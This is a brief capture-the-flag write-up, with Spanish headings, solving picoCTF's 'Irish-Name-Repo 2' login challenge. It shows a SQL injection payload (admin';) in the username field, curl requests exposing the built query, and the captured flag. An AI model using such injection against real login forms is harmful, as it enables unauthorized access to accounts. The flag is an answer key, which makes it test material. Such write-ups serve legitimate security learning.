# Irish-Name-Repo 2

## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/64649/` ([link](https://jupiter.challenges.picoctf.org/problem/64649/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:64649
## Solución
```bash
### Log In

Username:
admin';
Password:
hola

# Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_aee925db}

davidorado-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/64649/login.php -d "username=admin&password=admin&debug=1"
<pre>username: admin
password: admin
SQL query: SELECT * FROM users WHERE name='admin' AND password='admin'
</pre><h1>Login failed.</h1>davidorado-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/64649/login.php -d "username=admin';&password=admin&debug=1"
<pre>username: admin';
password: admin
SQL query: SELECT * FROM users WHERE name='admin';' AND password='admin'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_aee925db}</p>
```
## Notas adicionales

## Referencias